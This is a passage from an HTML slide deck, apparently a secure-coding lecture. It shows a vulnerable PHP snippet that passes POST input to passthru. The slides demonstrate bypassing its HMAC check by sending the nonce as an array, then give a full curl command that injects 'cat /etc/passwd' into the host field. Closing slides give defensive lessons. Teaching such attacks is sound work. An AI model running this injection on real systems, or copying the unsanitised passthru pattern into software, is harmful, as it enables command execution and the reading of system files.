2022-02-03/Presentation.html
<section id="slide-org09733f1" data-background="../common/background.png">
<h4 id="org09733f1"><span class="section-number-4">7.9.3.</span> What are the arguments this bit of code expects?</h4>
<div class="org-src-container">

<pre  class="src src-php"   ><code trim>    $<span style="color: #dcaeea;">secret</span> = getenv<span style="color: #51afef;">(</span><span style="color: #98be65;">"SECRET"</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #98be65;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>
        $<span style="color: #dcaeea;">secret</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    $<span style="color: #dcaeea;">hmac</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">hmac</span> !== $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'hmac'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
        header<span style="color: #c678dd;">(</span><span style="color: #98be65;">'HTTP/1.0 403 Forbidden'</span><span style="color: #c678dd;">)</span>;
        <span style="color: #51afef;">exit</span>;
    <span style="color: #51afef;">}</span>

    <span style="color: #51afef;">echo</span> passthru<span style="color: #51afef;">(</span><span style="color: #98be65;">"host "</span>.$<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

<p class="fragment appear">
What can we change?
</p>

<ul>
<li class="fragment appear"><code>hmac</code></li>
<li class="fragment appear"><code>host</code></li>
<li class="fragment appear"><code>nonce</code></li>

</ul>

</section>
<section id="slide-org3144fac" data-background="../common/background.png">
<h4 id="org3144fac"><span class="section-number-4">7.9.4.</span> What happens to <code>hash_hmac</code> when we change <code>$_POST['nonce']</code> to an array?</h4>
<p class="fragment appear">
Let&rsquo;s see!
</p>

</section>
<section id="slide-orgdab3e65" data-background="../common/background.png">
<h4 id="orgdab3e65"><span class="section-number-4">7.9.5.</span> Commands</h4>
<aside class="notes">
<p>
<a href="docker run -it php:7.4-apache-buster php -a">docker run -it php:7.4-apache-buster php -a</a>
</p>

</aside>

<div class="org-src-container">

<pre  class="src src-php"   ><code trim>$<span style="color: #dcaeea;">test_value</span> = <span style="color: #51afef;">[</span><span style="color: #98be65;">'1'</span>,<span style="color: #98be65;">'2'</span><span style="color: #51afef;">]</span>;
var_dump<span style="color: #51afef;">(</span>hash_hmac<span style="color: #c678dd;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">test_value</span>, <span style="color: #98be65;">'dummy'</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

<div class="org-src-container">

<pre  class="fragment appear"   ><code trim>var_dump<span style="color: #51afef;">(</span>hash_hmac<span style="color: #c678dd;">(</span><span style="color: #98be65;">'sha256'</span>, <span style="color: #98be65;">'a string'</span>, <span style="color: #a9a1e1;">NULL</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

</section>
<section id="slide-orgaeaa19d" data-background="../common/background.png">
<h4 id="orgaeaa19d"><span class="section-number-4">7.9.6.</span> It works!</h4>
<p class="fragment appear">
Now what?
</p>

</section>
<section id="slide-org0983fad" data-background="../common/background.png">
<h4 id="org0983fad"><span class="section-number-4">7.9.7.</span> Look at the source code again&#x2026;</h4>
<div class="org-src-container">

<pre  class="src src-php"   ><code trim>    $<span style="color: #dcaeea;">secret</span> = getenv<span style="color: #51afef;">(</span><span style="color: #98be65;">"SECRET"</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #98be65;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>
        $<span style="color: #dcaeea;">secret</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    $<span style="color: #dcaeea;">hmac</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">hmac</span> !== $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'hmac'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
        header<span style="color: #c678dd;">(</span><span style="color: #98be65;">'HTTP/1.0 403 Forbidden'</span><span style="color: #c678dd;">)</span>;
        <span style="color: #51afef;">exit</span>;
    <span style="color: #51afef;">}</span>

    <span style="color: #51afef;">echo</span> passthru<span style="color: #51afef;">(</span><span style="color: #98be65;">"host "</span>.$<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

</section>
<section id="slide-org63b7448" data-background="../common/background.png">
<h4 id="org63b7448"><span class="section-number-4">7.9.8.</span> Resulting query</h4>
<ul>
<li class="fragment appear">host: <code>google.com;cat /etc/passwd</code></li>
<li class="fragment appear">hmac: <code>bbf36c444a323aca2808...</code></li>
<li class="fragment appear">nonce[]: 1</li>
<li class="fragment appear">nonce[]: 2</li>

</ul>

</section>
<section id="slide-orgdb8045d" data-background="../common/background.png">
<h4 id="orgdb8045d"><span class="section-number-4">7.9.9.</span> Command</h4>
<div class="org-src-container">

<pre  class="src src-bash"   ><code trim><span style="color: #ECBE7B;">curl</span> --data <span style="color: #98be65;">"nonce[]=1&amp;nonce[]=2&amp;host=google.com;</span><span style="color: #98be65;">cat</span><span style="color: #98be65;"> /etc/passwd&amp;hmac=bbf36c444a323aca2808e486ea2165ff76d6f671e5dee9987007dba448230a53"</span> 10.104.58.39
</code></pre>
</div>
</section>
</section>
<section>
<section id="slide-org5df4a86" data-background="../common/background.png">
<h2 id="org5df4a86"><span class="section-number-2">8.</span> What can we learn from both examples?</h2>
<div class="outline-text-2" id="text-8">
</div>
</section>
<section id="slide-org143de7a" data-background="../common/background.png">
<h3 id="org143de7a"><span class="section-number-3">8.1.</span> Assume there is a problem</h3>
<p class="fragment appear">
It makes it easier to recover when there is one
</p>

</section>
<section id="slide-org89604be" data-background="../common/background.png">
<h3 id="org89604be"><span class="section-number-3">8.2.</span> Do not trust users!</h3>
<p class="fragment appear">
Limit user input and verify it is the right format and type
</p>

</section>
<section id="slide-orgd42cdbf" data-background="../common/background.png">
<h3 id="orgd42cdbf"><span class="section-number-3">8.3.</span> Do not trust your programming language!</h3>
<p class="fragment appear">
Learn the ins and outs of whatever language you are using
</p>

<p class="fragment appear">
Find a place to listen to news about your language of choice
</p>

</section>
</section>
<section>
<section id="slide-org6944aa4" data-background="../common/background.png">
<h2 id="org6944aa4"><span class="section-number-2">9.</span> How can we secure Example 1?</h2>
<div class="outline-text-2" id="text-9">
</div>
</section>
<section id="slide-org8544e8a" data-background="../common/background.png">
<h3 id="org8544e8a"><span class="section-number-3">9.1.</span> Don&rsquo;t provide the option to overflow the buffer: fgets(3)</h3>
</section>
<section id="slide-orge8be4d2" data-background="../common/background.png">
<h3 id="orge8be4d2"><span class="section-number-3">9.2.</span> Compare the following</h3>
<div class="org-src-container">

<pre  class="fragment appear"   ><code trim><span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">scanf</span><span style="color: #51afef;">(</span><span style="color: #51afef;">const</span> <span style="color: #ECBE7B;">char</span> <span style="color: #dcaeea;">format</span>, ...<span style="color: #51afef;">)</span>;
<span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">fscanf</span><span style="color: #51afef;">(</span><span style="color: #a9a1e1;">FILE</span> <span style="color: #ECBE7B;">strict</span> <span style="color: #dcaeea;">stream</span>, <span style="color: #51afef;">const</span> <span style="color: #ECBE7B;">char</span> <span style="color: #dcaeea;">format</span>, ...<span style="color: #51afef;">)</span>;
</code></pre>
</div>

<div class="org-src-container">

<pre  class="fragment appear"   ><code trim><span style="color: #ECBE7B;">char</span> *<span style="color: #c678dd;">fgets</span><span style="color: #51afef;">(</span><span style="color: #ECBE7B;">char</span> *<span style="color: #dcaeea;">s</span>, <span style="color: #ECBE7B;">int</span> <span style="color: #dcaeea;">size</span>, <span style="color: #ECBE7B;">FILE</span> *<span style="color: #dcaeea;">stream</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

<p class="fragment appear">
What&rsquo;s the main difference?
</p>

</section>
<section id="slide-orgc3b50e4" data-background="../common/background.png">
<h3 id="orgc3b50e4"><span class="section-number-3">9.3.</span> Where can you find vulnerabilities and alternatives like this?</h3>
<p class="fragment appear">
DuckDuckGo and Reddit
</p>

</section>
</section>
<section>
<section id="slide-org988df4b" data-background="../common/background.png">
<h2 id="org988df4b"><span class="section-number-2">10.</span> How can we secure Example 2?</h2>
<div class="outline-text-2" id="text-10">
</div>
</section>
<section id="slide-orge9614ee" data-background="../common/background.png">
<h3 id="orge9614ee"><span class="section-number-3">10.1.</span> Do not trust the types of your variables in weakly typed languages!</h3>
<p>
For PHP: <a href="https://www.php.net/manual/en/ref.var.php">https://www.php.net/manual/en/ref.var.php</a>
</p>
</section>
